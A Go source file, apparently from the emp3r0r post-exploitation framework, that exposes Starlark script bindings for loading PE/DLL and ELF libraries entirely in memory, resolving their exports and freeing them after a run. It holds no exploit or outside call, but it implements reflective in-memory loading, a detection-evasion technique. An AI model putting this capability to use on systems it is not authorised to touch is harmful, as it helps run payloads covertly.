//go:build windows || (linux && !android && (386 || amd64 || arm64))

package script

import (
	"fmt"
	"sync"

	"github.com/jm33-m0/emp3r0r/core/lib/memmod"
	"go.starlark.net/starlark"
)

// Starlark bindings for core/lib/memmod (in-memory PE/DLL and ELF loading).
//
// A loaded module is handed to the script as its base address; a per-run
// registry (stored on the Starlark thread) maps that handle back to the
// *memmod.Module so mem_proc_address / mem_proc_ordinal / mem_free can operate
// on it. The script can release a module early with mem_free, and any module
// it leaves mapped is freed automatically when the run ends, so a library is
// never left resident in cleartext after its user (the script) has finished.

func init() {
	RegisterAPI("mem_load_library", starlarkMemLoadLibrary)
	RegisterAPI("mem_load", starlarkMemLoadLibrary)
	RegisterAPI("mem_proc_address", starlarkMemProcAddress)
	RegisterAPI("mem_proc_ordinal", starlarkMemProcOrdinal)
	RegisterAPI("mem_free", starlarkMemFree)
	RegisterAPI("mem_base_addr", starlarkMemBaseAddr)
}

// runModules tracks the modules a single script run has mapped and not yet
// freed. It lives on the Starlark thread, so it never outlives the run.
type runModules struct {
	modules sync.Map // base uintptr -> *memmod.Module
}

func modulesForThread(thread *starlark.Thread) *runModules {
	if v := thread.Local("mem_modules"); v != nil {
		if m, ok := v.(*runModules); ok {
			return m
		}
	}
	m := &runModules{}
	thread.SetLocal("mem_modules", m)
	return m
}

func (m *runModules) add(base uintptr, module *memmod.Module) {
	m.modules.Store(base, module)
}

func (m *runModules) load(handle uint64) (*memmod.Module, bool) {
	v, ok := m.modules.Load(uintptr(handle))
	if !ok {
		return nil, false
	}
	module, ok := v.(*memmod.Module)
	return module, ok
}

func (m *runModules) remove(handle uint64) (*memmod.Module, bool) {
	v, ok := m.modules.LoadAndDelete(uintptr(handle))
	if !ok {
		return nil, false
	}
	module, ok := v.(*memmod.Module)
	return module, ok
}

// releaseRunModules frees every module the run left mapped.
func releaseRunModules(thread *starlark.Thread) {
	v := thread.Local("mem_modules")
	if v == nil {
		return
	}
	m, ok := v.(*runModules)
	if !ok {
		return
	}
	m.modules.Range(func(key, value any) bool {
		if module, ok := value.(*memmod.Module); ok {
			module.Free()
		}
		m.modules.Delete(key)
		return true
	})
}

// starlarkMemLoadLibrary maps a shared library image into the current process
// entirely in memory and returns its base address as the module handle.
func starlarkMemLoadLibrary(thread *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
	var dataVal starlark.Value
	if err := starlark.UnpackArgs(fn.Name(), args, kwargs, "data", &dataVal); err != nil {
		return starlark.None, err
	}
	data, err := starlarkToBytes(dataVal)
	if err != nil {
		return starlark.None, err
	}
	if err := memLoadPrepare(); err != nil {
		return starlark.MakeUint64(0), fmt.Errorf("mem_load_library: %w", err)
	}
	module, err := memmod.LoadLibrary(data)
	if err != nil {
		return starlark.MakeUint64(0), fmt.Errorf("mem_load_library: %w", err)
	}
	base := module.BaseAddr()
	modulesForThread(thread).add(base, module)
	return starlark.MakeUint64(uint64(base)), nil
}

// starlarkMemProcAddress returns the address of the named export of a
// previously loaded module.
func starlarkMemProcAddress(thread *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
	var handle uint64
	var name string
	if err := starlark.UnpackArgs(fn.Name(), args, kwargs, "module", &handle, "name", &name); err != nil {
		return starlark.None, err
	}
	module, ok := modulesForThread(thread).load(handle)
	if !ok {
		return starlark.None, fmt.Errorf("unknown module handle 0x%x (was it already freed?)", handle)
	}
	addr, err := module.ProcAddressByName(name)
	if err != nil {
		return starlark.None, fmt.Errorf("mem_proc_address %s: %w", name, err)
	}
	return starlark.MakeUint64(uint64(addr)), nil
}

// starlarkMemProcOrdinal returns the address of an export by ordinal.
func starlarkMemProcOrdinal(thread *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
	var handle uint64
	var ordinal int
	if err := starlark.UnpackArgs(fn.Name(), args, kwargs, "module", &handle, "ordinal", &ordinal); err != nil {
		return starlark.None, err
	}
	if ordinal < 0 || ordinal > 0xffff {
		return starlark.None, fmt.Errorf("mem_proc_ordinal: ordinal out of range: %d", ordinal)
	}
	module, ok := modulesForThread(thread).load(handle)
	if !ok {
		return starlark.None, fmt.Errorf("unknown module handle 0x%x (was it already freed?)", handle)
	}
	addr, err := module.ProcAddressByOrdinal(uint16(ordinal))
	if err != nil {
		return starlark.None, fmt.Errorf("mem_proc_ordinal %d: %w", ordinal, err)
	}
	return starlark.MakeUint64(uint64(addr)), nil
}

// starlarkMemFree unloads a module previously loaded with mem_load_library
// and drops it from the run registry.
func starlarkMemFree(thread *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
	var handle uint64
	if err := starlark.UnpackArgs(fn.Name(), args, kwargs, "module", &handle); err != nil {
		return starlark.None, err
	}
	module, ok := modulesForThread(thread).remove(handle)
	if !ok {
		return starlark.None, fmt.Errorf("unknown module handle 0x%x (was it already freed?)", handle)
	}
	module.Free()
	return starlark.None, nil
}

// starlarkMemBaseAddr returns the base address of a loaded module (the same
// value that mem_load_library returned).
func starlarkMemBaseAddr(thread *starlark.Thread, fn *starlark.Builtin, args starlark.Tuple, kwargs []starlark.Tuple) (starlark.Value, error) {
	var handle uint64
	if err := starlark.UnpackArgs(fn.Name(), args, kwargs, "module", &handle); err != nil {
		return starlark.None, err
	}
	module, ok := modulesForThread(thread).load(handle)
	if !ok {
		return starlark.None, fmt.Errorf("unknown module handle 0x%x (was it already freed?)", handle)
	}
	return starlark.MakeUint64(uint64(module.BaseAddr())), nil
}
